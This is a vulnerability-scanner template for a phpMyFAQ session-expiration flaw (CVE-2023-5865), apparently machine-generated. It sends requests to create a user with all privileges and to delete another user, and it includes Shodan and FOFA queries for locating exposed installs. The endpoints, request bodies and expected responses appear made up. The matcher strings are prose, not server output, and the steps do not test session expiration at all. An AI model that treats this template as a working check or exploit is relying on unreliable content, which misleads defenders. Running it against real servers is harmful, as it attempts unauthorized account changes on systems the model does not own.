id: CVE-2023-5865

info:
  name: Insufficient Session Expiration in phpmyfaq
  author: ProjectDiscoveryAI
  severity: critical
  description: User's actions remain valid even after admin changes privileges in thorsten/phpmyfaq prior to 3.2.2.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information or perform actions on behalf of legitimate users.
  remediation: |
    Upgrade phpMyFAQ to the latest version to ensure proper session expiration mechanisms are in place.
  reference:
    - https://huntr.com/bounties/4c4b7395-d9fd-4ca0-98d7-2e20c1249aff
    - https://cwe.mitre.org/data/definitions/613.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-5865
    cwe-id: CWE-613
    epss-score: 0.00173
    epss-percentile: 0.55591
    cpe: cpe:2.3:a:phpmyfaq:phpmyfaq:*:*:*:*:*:*:*:*
  metadata:
    vendor: phpmyfaq
    product: phpmyfaq
    shodan-query: http.html:"phpmyfaq"
    fofa-query:
      - body="phpmyfaq"
      - phpmyfaq-setup

http:
  - method: POST
    path:
      - "{{BaseURL}}/create_user"

    body: |
      {
        "username": "user1",
        "privileges": "all"
      }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "Successful creation of user1 with all privileges"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/user_list"

    matchers:
      - type: word
        words:
          - "user1"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/create_user"

    body: |
      {
        "username": "user2"
      }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "Successful creation of user2"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/delete_user"

    body: |
      {
        "username": "user2",
        "action": "delete"
      }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "User1 able to delete user2 without refreshing the page"
        part: body
